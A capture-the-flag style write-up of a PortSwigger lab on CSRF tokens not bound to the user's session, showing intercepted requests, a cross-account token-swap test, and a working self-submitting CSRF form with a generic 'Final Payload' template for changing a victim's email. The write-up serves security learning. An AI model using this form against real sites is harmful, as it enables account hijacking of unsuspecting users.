# Lab- CSRF where token is not tied to user session

## Objective

This lab's email change functionality still uses a CSRF token, but the description gave away the actual flaw upfront: the token isn't tied to the user's session. Unlike the previous two labs, the token here is real, correctly generated, and correctly required on every `POST` the question was whether it was actually being checked against the session that requested it, or just checked for validity in general. Two test accounts were provided (`wiener:peter` and `carlos:montoya`), which was the clue that this lab needed a cross-account comparison to prove the bypass.

---

## 1. Capturing My Own Token

I started on the account page as `wiener`, filled in a test email, and captured the request in Burp to see the request shape and grab a token tied to my own session:

```
POST /my-account/change-email HTTP/1.1
Host: 0a730030039ae40e82d4a6330031006e.web-security-academy.net
Cookie: session=Bua7MBJG4332a1K8cZ7yMWvYQ8c4ZByx
Content-Type: application/x-www-form-urlencoded

email=haidy%40gmail.com&csrf=ueRvN1yC63UROotIHHTNrcP0wupof0xK
```

This gave me `wiener`'s token: `ueRvN1yC63UROotIHHTNrcP0wupof0xK`. On its own this doesn't prove anything I needed a second, independent token from a completely different session to actually test the hypothesis

<img width="1568" height="781" alt="image" src="https://github.com/user-attachments/assets/796fbc77-a778-4acb-bb48-c808687fd8b3" />

<img width="1568" height="754" alt="image" src="https://github.com/user-attachments/assets/eeec582d-fb19-4766-9a56-45d3fd1dbe26" />

---

## 2. Capturing a Token From a Different Session

I logged in as the second test account, `carlos`, and repeated the same action, submitting an email change and intercepting the request. This produced `carlos`'s own session cookie and his own separately generated token:

```
POST /my-account/change-email HTTP/2
Host: 0a730030039ae40e82d4a6330031006e.web-security-academy.net
Cookie: session=IfgdSNFHghnRjrnsNgeMLCuRCFpoO5iL
Content-Type: application/x-www-form-urlencoded

email=dida%40gmail.com&csrf=c721jftIVMrQJW4fCrrj2QxVyHAExMkO
```

Now I had two tokens, each generated for a different session: `wiener`'s (`ueRvN1yC63UROotIHHTNrcP0wupof0xK`) and `carlos`'s own (`c721jftIVMrQJW4fCrrj2QxVyHAExMkO`).

<img width="1568" height="779" alt="image" src="https://github.com/user-attachments/assets/ca3864fb-b234-4663-940f-b59cdc7bcec0" />

---

## 3. Testing Whether the Token Is Tied to the Session

This was the actual test. I sent `carlos`'s intercepted request to Repeater, kept his session cookie exactly as it was, but swapped his own `csrf` value for `wiener`'s token instead:

```
POST /my-account/change-email HTTP/2
Host: 0a730030039ae40e82d4a6330031006e.web-security-academy.net
Cookie: session=IfgdSNFHghnRjrnsNgeMLCuRCFpoO5iL
Content-Type: application/x-www-form-urlencoded

email=dida%40gmail.com&csrf=ueRvN1yC63UROotIHHTNrcP0wupof0xK
```

If the server were correctly binding each token to the session that generated it, this should have been rejected — `carlos`'s session should only accept a token issued for `carlos`. Instead, the response came back as:

```
HTTP/2 302 Found
Location: /my-account?id=carlos
```

A successful redirect. `wiener`'s token was accepted on `carlos`'s session. This confirmed the vulnerability precisely as the lab description stated: the server checks that a `csrf` value is _valid and well-formed_, but never checks that it actually belongs to the session making the request.

<img width="1568" height="779" alt="image" src="https://github.com/user-attachments/assets/90e63bad-000c-405d-8475-b095261dbaf8" />

---

## 4. Building the Exploit

Since any valid token works regardless of who it was issued to, the attacker doesn't need to steal or predict the victim's token at all — they just need **any currently valid token from their own session**, paired with the victim's target email, submitted as a normal `POST`. I went to grab a fresh token before building the final exploit, since the ones I'd already used during testing weren't guaranteed to still be usable, and I needed a different email address anyway (the lab won't allow reusing an already-taken one).

With a fresh token in hand, I built the standard self-submitting CSRF form — this time including a hidden `csrf` field alongside `email`, since the token itself was required and would just be ignored as far as which session it belonged to:

```html
<html>
  <body>
    <form action="https://0a730030039ae40e82d4a6330031006e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="didadidit@gmail.com">
      <input type="hidden" name="csrf" value="Ew2FalpQdf6bAawj7RvDF0O3mnOEKQEo">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

<img width="1568" height="771" alt="image" src="https://github.com/user-attachments/assets/97003f68-d0bd-4f16-b9be-24fc16f67414" />

---

## 5. Delivering the Exploit

Clicked **Store**, then **Deliver exploit to victim**. The exploit server served the page, the victim's browser auto-submitted the form using the victim's own session cookie but the attacker's freshly grabbed token, and the email changed successfully.

The lab flagged as solved right after delivery.

<img width="1568" height="781" alt="image" src="https://github.com/user-attachments/assets/e7af5e95-2515-4b2e-b1f2-449b85dbf5af" />

---

## 6. Final Payload

```html
<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker-controlled@gmail.com">
      <input type="hidden" name="csrf" value="ANY-VALID-TOKEN-FROM-ANY-SESSION">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

The vulnerability: the server checks that the submitted `csrf` value is a token it previously issued, but never checks that it was issued _to the session making this specific request_. Any valid token, from any account, works on any session.

---

## 7. Notes

This lab was different from the previous two because the token itself wasn't broken, missing, or bypassable through method tricks, it was a legitimate, correctly-required, correctly-validated-looking token that simply wasn't bound to anything. That's a much harder bug to spot from a single account's traffic alone, since everything about the request looks completely correct in isolation. This is exactly why the lab handed me two separate test accounts instead of one: the vulnerability is only provable by comparing tokens _across_ sessions, not by staring at one session's requests no matter how carefully.

The actual test, swap one session's valid token into another session's otherwise-identical request is now something I'll treat as a standard check whenever an app uses a synchronizer-style CSRF token, alongside the method-tampering and missing-parameter tests from the last two labs. Three different ways the "same" protection can fail: the check isn't wired into every method, the check only runs if the parameter exists, or the check never verifies ownership of the token in the first place. A token existing and looking valid tells you almost nothing on its own, the only thing that matters is exactly what condition the server verifies before accepting it.
